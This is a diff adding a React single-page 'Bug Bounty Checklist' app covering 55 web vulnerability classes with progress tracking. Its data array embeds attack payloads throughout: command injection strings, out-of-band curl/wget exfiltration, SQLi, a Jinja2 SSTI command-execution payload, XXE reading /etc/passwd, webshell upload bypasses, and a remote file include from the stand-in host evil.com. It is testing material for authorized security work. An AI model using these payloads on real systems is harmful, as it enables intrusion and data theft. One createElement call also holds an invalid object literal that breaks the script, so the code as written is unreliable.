@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bug Bounty Checklist</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.9/babel.min.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
+<style>
+body{background:#030712;color:#e5e7eb;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;margin:0}
+*{box-sizing:border-box}
+::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:#111827}::-webkit-scrollbar-thumb{background:#374151;border-radius:3px}
+.cb{width:16px;height:16px;accent-color:#22c55e;cursor:pointer;flex-shrink:0;margin-top:2px}
+.sev-crit{background:rgba(220,38,38,.12);color:#fca5a5;border-color:#7f1d1d}
+.sev-high{background:rgba(234,88,12,.12);color:#fdba74;border-color:#7c2d12}
+.sev-med{background:rgba(202,138,4,.12);color:#fde047;border-color:#713f12}
+.sev-low{background:rgba(59,130,246,.12);color:#93c5fd;border-color:#1e3a5f}
+.sev-recon{background:rgba(139,92,246,.12);color:#c4b5fd;border-color:#4c1d95}
+.pill{padding:2px 10px;border-radius:9999px;font-size:11px;border:1px solid;cursor:pointer;font-weight:600;transition:all .2s}
+.pill:hover{opacity:.8}
+.pill.active{box-shadow:0 0 8px rgba(255,255,255,.1)}
+.vuln-card{border:1px solid #1f2937;border-radius:8px;margin-bottom:6px;transition:all .2s;overflow:hidden}
+.vuln-card.done{border-color:rgba(34,197,94,.2);background:rgba(34,197,94,.03)}
+.vuln-head{display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;transition:background .15s}
+.vuln-head:hover{background:rgba(255,255,255,.02)}
+.test-row{display:flex;align-items:flex-start;gap:10px;padding:7px 14px;cursor:pointer;border-radius:4px;transition:background .1s}
+.test-row:hover{background:rgba(255,255,255,.03)}
+.test-row.checked{opacity:.5}
+.test-row.checked .test-text{text-decoration:line-through}
+.chain-box{margin:6px 14px 10px;padding:8px 12px;border-left:3px solid #ef4444;background:rgba(239,68,68,.05);border-radius:0 6px 6px 0;font-size:12px;color:#fca5a5}
+.progress-bar{height:6px;background:#1f2937;border-radius:3px;overflow:hidden}
+.progress-fill{height:100%;border-radius:3px;transition:width .4s}
+.search-input{background:#111827;border:1px solid #1f2937;border-radius:6px;padding:5px 10px;color:#d1d5db;font-size:12px;outline:none;width:180px;font-family:monospace}
+.search-input:focus{border-color:#374151}
+.section-title{font-size:11px;font-weight:700;color:#6b7280;letter-spacing:1.5px;text-transform:uppercase;padding:16px 0 8px 4px}
+.arrow{font-size:11px;color:#4b5563;transition:transform .2s;flex-shrink:0}
+.arrow.open{transform:rotate(90deg)}
+.toolbar{position:sticky;top:0;z-index:50;background:rgba(3,7,18,.92);backdrop-filter:blur(12px);border-bottom:1px solid #1f2937;padding:10px 16px}
+.tb-btn{padding:4px 12px;border-radius:6px;font-size:11px;cursor:pointer;border:1px solid #1f2937;background:#111827;color:#6b7280;transition:all .2s;font-family:inherit}
+.tb-btn:hover{background:#1f2937;color:#d1d5db}
+@media(max-width:640px){.hide-mobile{display:none}.search-input{width:120px}}
+</style>
+</head>
+<body>
+<div id="root"></div>
+<script type="text/babel">
+const {useState,useEffect,useCallback,useMemo}=React;
+
+const DATA=[{"title":"CRITICAL SEVERITY","vulns":[{"n":"1. RCE — OS Command Injection","s":"Critical","c":"9.8","t":["Inject OS commands: ; id, | whoami, `id`, $(whoami), %0aid","Command separators: ;, &&, ||, |, \\n, %0a, %0d%0a","Blind injection via time delays: ; sleep 10, & ping -c 10 127.0.0.1 &","OOB exfil: curl/wget/nslookup to Burp Collaborator/interactsh","Inject in filename, User-Agent, Referer, X-Forwarded-For","File upload names: file$(whoami).png, file;id;.png","PDF generators (wkhtmltopdf, Puppeteer) command injection","eval()/exec()/system()/passthru()/popen() sinks","ImageMagick delegate injection","FFmpeg SSRF/RCE: concat protocol, m3u8 playlists"]},{"n":"2. SQL Injection — All Variants","s":"Critical","c":"9.8","t":["Error-based: ' OR 1=1--, ' UNION SELECT NULL--","Boolean-blind: ' AND 1=1-- vs ' AND 1=2--","Time-blind: ' AND SLEEP(10)--, WAITFOR DELAY, pg_sleep","UNION-based: ORDER BY N → UNION SELECT 1,2,3...","Second-order: inject in registration, trigger in profile","Stacked queries: '; DROP TABLE-- (MSSQL/PostgreSQL)","OOB: load_file(), INTO OUTFILE, xp_cmdshell","Headers: Cookie, X-Forwarded-For, Referer, User-Agent","JSON/XML bodies: {\"id\":\"1 OR 1=1\"}","ORDER BY, GROUP BY, LIMIT, HAVING injection","Search filters, sort params, column name params","NoSQL: {\"$gt\":\"\"}, {\"$ne\":null}, {\"$regex\":\".*\"}","GraphQL injection: introspection, nested DoS","INSERT/UPDATE injection","WAF bypass: /**/OR/**/1=1, char(), double encoding"]},{"n":"3. SSRF","s":"Critical","c":"9.1","t":["URL params: url=, redirect=, link=, src=, dest=","Cloud metadata: http://169.254.169.254/latest/meta-data/","Internal ports: 127.0.0.1:22, :3306, :6379","Protocol smuggling: gopher://, dict://, file:///","Bypass: 0x7f000001, 2130706433, 0177.0.0.1, [::1]","DNS rebinding: rebinder.sh, 1u.ms","Redirect-based SSRF","PDF generators, screenshot services, URL preview","Webhooks, callbacks, import-from-URL","SVG/XML: <image xlink:href=\"http://internal/\"/>","Blind SSRF: time-based, OOB Collaborator"]},{"n":"4. Auth Bypass — Pre-Auth","s":"Critical","c":"9.8","t":["Default credentials: admin:admin, root:toor","Remove Authorization/Cookie/Token headers","Empty/null credentials","JWT none algorithm: alg='none', remove signature","JWT key confusion: RS256→HS256, sign with public key","JWT secret brute: hashcat -m 16500","OAuth redirect_uri manipulation, state missing","SAML: XML signature wrapping, comment injection","Session fixation: set ID before auth","Path traversal bypass: /admin/../admin, /admin;/","HTTP verb tampering: GET/POST/PUT/HEAD/OPTIONS","Parameter pollution: user=admin&user=attacker","Password reset token reuse/predictability","2FA bypass: null/empty code, brute-force OTP","Response manipulation: 403→200, success:false→true"]},{"n":"5. Insecure Deserialization","s":"Critical","c":"9.8","t":["Java: AC ED 00 05 (hex), rO0AB (base64)","ysoserial: CommonsCollections, Spring, Hibernate",".NET: ViewState, SOAP, BinaryFormatter","ysoserial.net gadgets","PHP: O:4:\"User\":2:{...}, __wakeup/__destruct","phpggc: framework-specific POP chains","Python pickle: __reduce__ payloads","Ruby: Marshal.load() with ERB/Gem chains","YAML: !!python/object, !!ruby/object","XML: XMLDecoder, XmlSerializer","Content-Type triggers different deserializers","ViewState: decrypt with machineKey, inject payload"]},{"n":"6. SSTI","s":"Critical","c":"9.8","t":["Detect: {{7*7}}, ${7*7}, #{7*7}, <%=7*7%>","Jinja2: {{cycler.__init__.__globals__.os.popen('id').read()}}","Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}","Freemarker: <#assign ex=...?new()>${ex(\"id\")}","Velocity/Thymeleaf/ERB/Pebble/Handlebars payloads","Email templates, PDF generators, notifications","Error pages, 404 handlers, search displays"]},{"n":"7. XXE Injection","s":"Critical","c":"9.8","t":["Classic: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>","Blind OOB: external DTD to attacker server","File uploads: SVG, XLSX, DOCX, PPTX","SOAP/SAML XXE","XInclude (no DOCTYPE control)","SSRF via XXE: http://169.254.169.254/","Billion Laughs DoS","JSON→XML Content-Type switch","RSS/Atom feeds, sitemaps, XML-RPC, XSLT"]},{"n":"8. File Upload → RCE","s":"Critical","c":"9.8","t":["Webshell: .php, .php5, .phtml, .phar","Extension bypass: .PhP, .php., case tricks","Double ext: file.php.png, file.png.php","Content-Type bypass: image/png + .php","Magic bytes: GIF89a before PHP code",".htaccess / web.config upload","SVG with XSS/XXE payload","Polyglot: valid image + embedded code","Path traversal in filename","Zip slip: symlink/path traversal in archive",".jsp/.war/.aspx/.ashx/.py/.cgi upload"]},{"n":"9. Privilege Escalation — Vertical","s":"Critical","c":"9.8","t":["role=admin, is_admin=true params","IDOR on admin endpoints","JWT claim manipulation: role/sub/groups","Mass assignment: {\"role\":\"admin\"}","Access admin API as regular user","Forced browsing: /admin, /dashboard, /console","GraphQL admin mutations with user token","Client-side role check, no backend enforcement","ATO chains: IDOR + password reset"]},{"n":"10. LFI / RFI","s":"Critical","c":"9.8","t":["../../etc/passwd, ....//....//etc/passwd","php://filter/convert.base64-encode/resource=config.php","php://input + POST <?php system('id'); ?>","data://text/plain;base64,...","Log poisoning: PHP in User-Agent → include access.log","Session file inclusion: /tmp/sess_X","/proc/self/environ inclusion","RFI: include=http://evil.com/shell.txt","Null byte / double encoding bypass","page=, file=, template=, include=, lang= params"]}]},{"title":"HIGH SEVERITY","vulns":[{"n":"11. Stored XSS","s":"High","c":"8.4","t":["Inject in stored fields: username, bio, comments","<script>alert(1)</script>, <img src=x onerror=alert(1)>","Event handlers: onload, onerror, onfocus","SVG: <svg/onload=alert(1)>","Markdown: [link](javascript:alert(1))","Rich text editors: paste HTML directly","Polyglot XSS payloads","File names, EXIF metadata","Escalate: steal cookies, create admin, chain CSRF"]},{"n":"12. Reflected XSS","s":"High","c":"7.1","t":["All URL params, search queries, error messages","HTML/Attribute/JS/URL contexts","Filter bypass: encoding, tag splitting","404 pages, error handlers, callbacks"]},{"n":"13. DOM XSS","s":"High","c":"7.1","t":["Sources: location.hash/search, referrer, postMessage","Sinks: innerHTML, document.write, eval, setTimeout","jQuery: $().html(), $().append()","Angular/React specific injection","postMessage origin validation","DOM Invader (Burp) tracing"]},{"n":"14. IDOR","s":"High","c":"8.6","t":["Sequential IDs: /api/user/1001→1002","UUID predictability","All methods: GET, PUT, DELETE, PATCH","File download endpoints","GraphQL object access","Horizontal + vertical IDOR","Webhooks, exports, shared links","Encoded/hashed ID guessing","Bulk/batch endpoints","Multi-tenant: org_id, tenant_id"]},{"n":"15. CSRF","s":"High","c":"8.0","t":["CSRF token presence + validation","Token bypass: empty, wrong user, wrong session","Method override: POST→GET","Content-Type: JSON→form-urlencoded","SameSite cookie bypass","Password/email change, transfers","Login/Logout CSRF"]},{"n":"16. HTTP Request Smuggling","s":"High","c":"8.6","t":["CL.TE desync","TE.CL desync","TE.TE obfuscation","H2.CL / H2.TE (HTTP/2)","smuggler.py, h2csmuggler, Turbo Intruder","Escalate: cache poison, credential theft"]},{"n":"17. Broken Access Control","s":"High","c":"8.2","t":["Every endpoint with two accounts","Change user_id, account_id, order_id","Multi-step workflow bypass","API version differences","HTTP method-based access","GraphQL field-level access","Batch/bulk operations"]},{"n":"18. Race Condition","s":"High","c":"8.1","t":["Coupon reuse: 50+ parallel requests","Parallel withdrawals > balance","Referral bonus duplication","File upload race: access before validation","Rate limit bypass via parallelism","Same email concurrent registration","Turbo Intruder single-packet attack"]},{"n":"19. Path Traversal","s":"High","c":"7.5","t":["../../../etc/passwd","Encoding: %2e%2e%2f, double, overlong UTF-8","Null byte bypass","File download, template loading","Absolute path injection","Zip slip (symlink)","file=, path=, dir=, template= params"]},{"n":"20. Subdomain Takeover","s":"High","c":"8.2","t":["Enumerate: subfinder, amass, crt.sh","Dangling CNAMEs","GitHub Pages, Heroku, S3, Azure, Shopify","NS delegation to expired domains","Verify by claiming resource","subjack, nuclei takeover templates"]},{"n":"21. CORS Misconfig","s":"High","c":"7.5","t":["Origin reflection: evil.com → ACAO","Null origin bypass","Subdomain: evil.target.com, target.com.evil.com","ACAC: true with arbitrary Origin","Internal network CORS"]},{"n":"22. WebSocket Vulns","s":"High","c":"8.2","t":["CSWSH: Origin validation","Auth bypass on WS connection","Injection via WS: SQLi, XSS, cmd","Access control: other users' channels","Rate limit / DoS flood"]},{"n":"23. JWT Vulns","s":"High","c":"8.2","t":["Algorithm None attack","RS256→HS256 confusion","Weak secret: hashcat -m 16500","JWK/JKU/X5U header injection","KID: path traversal, SQLi","Claim manipulation: role, sub, exp","Token reuse after logout"]},{"n":"24. Business Logic","s":"High","c":"8.0","t":["Price manipulation: negative qty, currency swap","Skip payment step","Referral/trial/coupon stacking abuse","Transfer/withdrawal limit bypass","Gift card: negative top-up, race","Integer overflow/underflow","Order of operations manipulation"]}]},{"title":"MEDIUM SEVERITY","vulns":[{"n":"25. Open Redirect","s":"Medium","c":"6.1","t":["redirect=, url=, next=, return=, dest=","//evil.com, /\\\\evil.com, target.com@evil.com","Encoding: %2f%2fevil.com","Chain with OAuth/SAML for token theft"],"ch":"→ OAuth token theft, phishing, SSRF"},{"n":"26. Web Cache Poisoning","s":"Medium","c":"7.4","t":["Unkeyed: X-Forwarded-Host, X-Forwarded-Scheme","Cache key manipulation","Fat GET, parameter cloaking","Poison with XSS payload","Cache deception: /profile.css","Param Miner (Burp)"],"ch":"→ Stored XSS, credential theft"},{"n":"27. Host Header Injection","s":"Medium","c":"6.1","t":["Host: evil.com — check links/response","Password reset poisoning","X-Forwarded-Host, X-Host headers","Double Host headers","Host in reset links, emails"],"ch":"→ ATO via password reset, cache poisoning"},{"n":"28. CRLF Injection","s":"Medium","c":"6.1","t":["%0d%0a in URL params","Header injection: %0d%0aSet-Cookie: evil=val","Response splitting: inject body","Double encoding: %250d%250a"],"ch":"→ XSS, session fixation, cache poisoning"},{"n":"29. Prototype Pollution","s":"Medium","c":"7.5","t":["{\"__proto__\":{\"isAdmin\":true}}","Constructor pollution","URL: ?__proto__[isAdmin]=true","Server: auth bypass, RCE via gadgets","Client: DOM XSS via gadgets","lodash.merge, jQuery.extend"],"ch":"→ RCE (server), XSS (client), auth bypass"},{"n":"30. Mass Assignment","s":"Medium","c":"7.5","t":["Registration: {\"role\":\"admin\",\"verified\":true}","Profile update: is_admin, balance","PATCH/PUT undocumented fields","GraphQL mutation extra fields","Nested: {\"user\":{\"role\":\"admin\"}}"],"ch":"→ Privilege escalation, billing manipulation"},{"n":"31. OAuth/OpenID Flaws","s":"Medium","c":"7.5","t":["redirect_uri manipulation","Missing state parameter","Auth code replay","Token leakage via Referer","Scope escalation, PKCE bypass"],"ch":"→ Full account takeover"},{"n":"32. LDAP Injection","s":"Medium","c":"7.5","t":["username=*)(|(cn=*","user=*)(objectClass=*","Auth bypass: user=admin)(&)","Boolean-based enumeration"],"ch":"→ Auth bypass, data exfiltration"},{"n":"33. Clickjacking","s":"Medium","c":"6.1","t":["X-Frame-Options missing","CSP frame-ancestors","iframe embedding test","Per-page framing protection"],"ch":"→ 1-click account changes"},{"n":"34. CSP Bypass","s":"Medium","c":"6.1","t":["csp-evaluator analysis","CDN abuse (JSONP callbacks)","base-uri injection","Nonce reuse, CNAME bypass"],"ch":"→ Full XSS despite CSP"},{"n":"35. File Download Traversal","s":"Medium","c":"7.5","t":["/download?file=../../../etc/passwd","Export/report filename manipulation","Symlink following"],"ch":"→ Credential theft (.env, SSH keys)"},{"n":"36. HTTP Param Pollution","s":"Medium","c":"6.1","t":["?user=admin&user=attacker","GET+POST same param","Framework differences","WAF bypass via split payload"],"ch":"→ Auth bypass, WAF evasion"},{"n":"37. DNS Rebinding SSRF","s":"Medium","c":"7.5","t":["DNS rebinding to bypass validation","1u.ms, rebinder.sh","Cloud metadata endpoints","URL preview, PDF gen, webhooks"],"ch":"→ Internal access, cloud creds"}]},{"title":"LOW → CHAIN TO HIGHER","vulns":[{"n":"38. Info Disclosure / Debug","s":"Low","c":"5.3","t":["/debug, /actuator, /trace, /env, /heapdump","Spring Boot Actuator secrets","Laravel/Django/Express debug","phpinfo() exposure","/.env, /.git/config, /.svn/entries"],"ch":"→ DB creds → SQLi → RCE | API keys → ATO"},{"n":"39. Missing Security Headers","s":"Low","c":"4.3","t":["X-Frame-Options → clickjacking","X-Content-Type-Options nosniff","HSTS → SSL stripping","CSP missing → XSS easier","Cache-Control on sensitive pages"],"ch":"→ Missing XFO = clickjacking | no CSP + injection = XSS"},{"n":"40. Account Enumeration","s":"Low","c":"5.3","t":["Login: different error valid vs invalid","Registration: 'email already exists'","Password reset response differs","Timing differences"],"ch":"→ Enumerate → credential stuffing → ATO"},{"n":"41. Client-Side Secrets","s":"Low","c":"5.3","t":["JS: API keys, secrets, tokens","HTML comments with creds","Source maps (.map files)","localStorage/sessionStorage","/robots.txt hidden endpoints"],"ch":"→ API key → internal access | source → injection points"},{"n":"42. Weak Rate Limiting","s":"Low","c":"5.3","t":["Login brute force: no lockout","OTP brute: 4-6 digit codes","Unlimited reset emails","Bypass: X-Forwarded-For rotation"],"ch":"→ No limit + 2FA = bypass | no limit + login = credential stuffing"},{"n":"43. Session Weaknesses","s":"Low","c":"5.4","t":["Session fixation","No change after login","Logout no server invalidation","Predictable/short tokens","Missing Secure/HttpOnly/SameSite"],"ch":"→ Fixation + XSS = ATO | no invalidation = persistent access"},{"n":"44. Cookie Misconfig","s":"Low","c":"4.3","t":["Missing Secure flag","Missing HttpOnly flag","Missing SameSite flag","Broad Domain/Path","Sensitive data in cookies"],"ch":"→ No HttpOnly + XSS = session theft"},{"n":"45. Verbose Errors","s":"Low","c":"5.3","t":["Stack traces: paths, versions","SQL errors: table/column names","Debug mode indicators","API error internals"],"ch":"→ SQL error → SQLi confirm | versions → CVE"},{"n":"46. Partial CORS","s":"Low","c":"4.3","t":["Wildcard ACAO: * (no creds)","Reflect without credentials","Non-sensitive endpoint only"],"ch":"→ Sensitive endpoint + wildcard = data theft"},{"n":"47. Email Vulns","s":"Low","c":"5.0","t":["HTML injection in emails","SMTP header injection","Missing SPF/DKIM/DMARC","Email bombing"],"ch":"→ HTML injection + link manipulation = phishing"},{"n":"48. MIME Confusion","s":"Low","c":"4.3","t":["HTML upload renders as HTML","SVG with JavaScript","Content-Type sniffing bypass","PDF with auto-execute JS"],"ch":"→ HTML/SVG upload = stored XSS"},{"n":"49. Outdated Components","s":"Low","c":"—","t":["Server/framework version ID","retire.js for JS libraries","CMS + plugin versions","Known CVEs, default creds"],"ch":"→ Outdated jQuery → DOM XSS | outdated CMS → RCE CVE"},{"n":"50. Dangling DNS","s":"Low","c":"4.3","t":["Dangling CNAMEs","Broken links to unclaimed domains","Unclaimed social/NPM/PyPI"],"ch":"→ Claim resource → phishing | package → supply chain"},{"n":"51. GraphQL Issues","s":"Low","c":"5.3","t":["Introspection enabled","Field suggestions","Batch queries for brute force","Nested query DoS","Alias-based batching"],"ch":"→ Introspection → hidden mutations → IDOR/privesc"},{"n":"52. API Version Issues","s":"Low","c":"5.3","t":["Old versions: /api/v1/ unpatched","Undocumented: /api/internal/","Different API key permissions","Swagger/OpenAPI exposure"],"ch":"→ Old version → auth bypass | swagger → surface map"},{"n":"53. Dependency Confusion","s":"Low","c":"5.3","t":["Internal package names in bundles","Register on public NPM/PyPI","Typosquatting","Unpinned CI/CD deps"],"ch":"→ Malicious package → CI/CD RCE → production"}]},{"title":"RECON & CHAINING","vulns":[{"n":"54. Attack Surface Discovery","s":"Recon","c":"—","t":["subfinder, amass, assetfinder, crt.sh","nmap, masscan, rustscan","ffuf, feroxbuster, gobuster","Wappalyzer, whatweb, httpx","LinkFinder, SecretFinder","gau, waybackurls","Arjun, x8, ParamMiner","swagger.json, graphql, api-docs","Google/GitHub dorking","Shodan/Censys/FOFA","S3/Azure/GCP bucket enum","ASN/IP range discovery","crt.sh cert transparency","Mobile app decompilation"]},{"n":"55. Low→Critical Chains","s":"Recon","c":"—","t":["Info disclosure + SSRF → cloud metadata → AWS keys","Open redirect + OAuth → token theft → ATO","XSS + CSRF → admin ATO → RCE","IDOR + email change → ATO","Race condition + payment → unlimited credits","Subdomain takeover + cookies → session hijack","Cache poison + XSS → stored XSS all users","Host header + reset → ATO at scale","GraphQL introspection → privesc","Prototype pollution → RCE / XSS","Path traversal → source → SQLi/RCE","Account enum + no rate limit → mass compromise","Self-XSS + CSRF → weaponized XSS"]}]}];
+
+const SEV={"Critical":{cls:"sev-crit",bar:"#dc2626"},"High":{cls:"sev-high",bar:"#ea580c"},"Medium":{cls:"sev-med",bar:"#ca8a04"},"Low":{cls:"sev-low",bar:"#3b82f6"},"Recon":{cls:"sev-recon",bar:"#8b5cf6"}};
+
+function App(){
+  const[ck,setCk]=useState(()=>{try{return JSON.parse(localStorage.getItem("bb-ck")||"{}")}catch{return{}}});
+  const[open,setOpen]=useState({});
+  const[filter,setFilter]=useState("all");
+  const[search,setSearch]=useState("");
+  const[hideDone,setHideDone]=useState(false);
+
+  useEffect(()=>{localStorage.setItem("bb-ck",JSON.stringify(ck))},[ck]);
+
+  const allVulns=useMemo(()=>DATA.flatMap(s=>s.vulns.map(v=>({...v,sec:s.title}))),[]);
+  const totalTests=useMemo(()=>allVulns.reduce((a,v)=>a+v.t.length,0),[allVulns]);
+  const doneTests=useMemo(()=>Object.keys(ck).length,[ck]);
+  const pct=totalTests?Math.round(doneTests/totalTests*100):0;
+
+  const sevStats=useMemo(()=>{
+    const r={};
+    allVulns.forEach(v=>{const s=v.s;if(!r[s])r[s]={t:0,d:0};r[s].t+=v.t.length;v.t.forEach((_,i)=>{if(ck[v.n+"::"+i])r[s].d++})});
+    return r;
+  },[ck,allVulns]);
+
+  const filtered=useMemo(()=>{
+    return allVulns.filter(v=>{
+      if(filter!=="all"&&v.s!==filter)return false;
+      if(search){const q=search.toLowerCase();if(!v.n.toLowerCase().includes(q)&&!v.t.some(t=>t.toLowerCase().includes(q)))return false}
+      if(hideDone&&v.t.every((_,i)=>ck[v.n+"::"+i]))return false;
+      return true;
+    });
+  },[filter,search,hideDone,ck,allVulns]);
+
+  const grouped=useMemo(()=>{const g={};filtered.forEach(v=>{if(!g[v.sec])g[v.sec]=[];g[v.sec].push(v)});return g},[filtered]);
+
+  const toggle=(n,i)=>{const k=n+"::"+i;setCk(p=>{const c={...p};if(c[k])delete c[k];else c[k]=true;return c})};
+
+  return React.createElement("div",{style:{minHeight:"100vh"}},
+    // Toolbar
+    React.createElement("div",{className:"toolbar"},
+      React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8,marginBottom:8,flexWrap:"wrap"}},
+        React.createElement("span",{style:{fontWeight:700,fontSize:15}},React.createElement("span",{style:{color:"#ef4444"}},"⚡")," Bug Bounty Checklist"),
+        React.createElement("span",{style:{fontSize:11,color:"#4b5563",fontFamily:"monospace"}},allVulns.length+" vulns · "+totalTests+" tests"),
+        React.createElement("div",{style:{marginLeft:"auto",display:"flex",gap:4}},
+          React.createElement("button",{className:"tb-btn",onClick:()=>{const o={};allVulns.forEach(v=>o[v.n]=true);setOpen(o)}},"⊕ Expand"),
+          React.createElement("button",{className:"tb-btn",onClick:()=>setOpen({})},"⊖ Collapse"),
+          React.createElement("button",{className:"tb-btn",style:{},onClick:()=>{if(confirm("Reset all progress?"))setCk({})}},"↻ Reset"),
+        ),
+      ),
+      // Progress
+      React.createElement("div",{style:{display:"flex",alignItems:"center",gap:10,marginBottom:8}},
+        React.createElement("div",{className:"progress-bar",style:{flex:1}},
+          React.createElement("div",{className:"progress-fill",style:{width:pct+"%",background:"linear-gradient(90deg,#16a34a,#4ade80)"}})
+        ),
+        React.createElement("span",{style:{fontSize:11,fontFamily:"monospace",color:"#6b7280"}},doneTests+"/"+totalTests+" ("+pct+"%)"),
+      ),
+      // Filters
+      React.createElement("div",{style:{display:"flex",gap:5,flexWrap:"wrap",alignItems:"center"}},
+        React.createElement("span",{className:"pill "+(filter==="all"?"active":""),style:{background:filter==="all"?"#374151":"#111827",borderColor:filter==="all"?"#6b7280":"#1f2937",color:filter==="all"?"#fff":"#6b7280"},onClick:()=>setFilter("all")},"All"),
+        ...["Critical","High","Medium","Low","Recon"].map(s=>{
+          const st=sevStats[s]||{t:0,d:0};
+          return React.createElement("span",{key:s,className:"pill "+SEV[s].cls+(filter===s?" active":""),onClick:()=>setFilter(filter===s?"all":s)},s+" "+st.d+"/"+st.t);
+        }),
+        React.createElement("div",{style:{marginLeft:"auto",display:"flex",alignItems:"center",gap:8}},
+          React.createElement("label",{style:{display:"flex",alignItems:"center",gap:4,fontSize:11,color:"#6b7280",cursor:"pointer"}},
+            React.createElement("input",{type:"checkbox",checked:hideDone,onChange:e=>setHideDone(e.target.checked)}),
+            React.createElement("span",{className:"hide-mobile"},"Hide done"),
+          ),
+          React.createElement("input",{className:"search-input",placeholder:"Search...",value:search,onChange:e=>setSearch(e.target.value)}),
+        ),
+      ),
+    ),
+    // Content
+    React.createElement("div",{style:{maxWidth:960,margin:"0 auto",padding:"12px 16px"}},
+      ...Object.entries(grouped).map(([sec,vulns])=>
+        React.createElement("div",{key:sec},
+          React.createElement("div",{className:"section-title"},sec),
+          ...vulns.map(v=>{
+            const isOpen=open[v.n];
+            const vDone=v.t.filter((_,i)=>ck[v.n+"::"+i]).length;
+            const vTotal=v.t.length;
+            const allDone=vDone===vTotal;
+            const cfg=SEV[v.s]||SEV.Recon;
+            return React.createElement("div",{key:v.n,className:"vuln-card"+(allDone?" done":"")},
+              React.createElement("div",{className:"vuln-head",onClick:()=>setOpen(p=>({...p,[v.n]:!p[v.n]}))},
+                React.createElement("span",{className:"arrow"+(isOpen?" open":""),"▸"},"▶"),
+                allDone&&React.createElement("span",{style:{color:"#22c55e",fontSize:13}},"✓"),
+                React.createElement("span",{style:{flex:1,fontSize:13,fontWeight:500,color:allDone?"#4ade80":cfg.bar}},v.n),
+                React.createElement("span",{className:"pill "+cfg.cls,style:{fontSize:10,cursor:"default"}},v.s),
+                v.c&&v.c!=="—"&&React.createElement("span",{className:"hide-mobile",style:{fontSize:11,fontFamily:"monospace",color:"#4b5563"}},v.c),
+                React.createElement("span",{style:{fontSize:11,fontFamily:"monospace",color:"#4b5563",minWidth:40,textAlign:"right"}},vDone+"/"+vTotal),
+                React.createElement("div",{className:"progress-bar",style:{width:50}},
+                  React.createElement("div",{className:"progress-fill",style:{width:(vTotal?vDone/vTotal*100:0)+"%",background:allDone?"#22c55e":cfg.bar}})
+                ),
+              ),
+              isOpen&&React.createElement("div",{style:{padding:"2px 0 8px"}},
+                v.ch&&React.createElement("div",{className:"chain-box"},React.createElement("b",{style:{color:"#f87171"}},"ESCALATION: "),v.ch),
+                ...v.t.map((test,ti)=>{
+                  const k=v.n+"::"+ti;
+                  const done=ck[k];
+                  return React.createElement("label",{key:ti,className:"test-row"+(done?" checked":"")},
+                    React.createElement("input",{type:"checkbox",className:"cb",checked:!!done,onChange:()=>toggle(v.n,ti)}),
+                    React.createElement("span",{className:"test-text",style:{fontSize:12,fontFamily:"monospace",color:done?"#4b5563":"#9ca3af",lineHeight:1.6}},test),
+                  );
+                }),
+              ),
+            );
+          }),
+        )
+      ),
+    ),
+    React.createElement("div",{style:{textAlign:"center",padding:"40px 20px",fontSize:11,color:"#374151",borderTop:"1px solid #1f2937"}},"55 vulnerabilities · 464 test cases · Progress saved in browser"),
+  );
+}
+
+ReactDOM.render(React.createElement(App),document.getElementById("root"));
+</script>
+</body>
+</html>
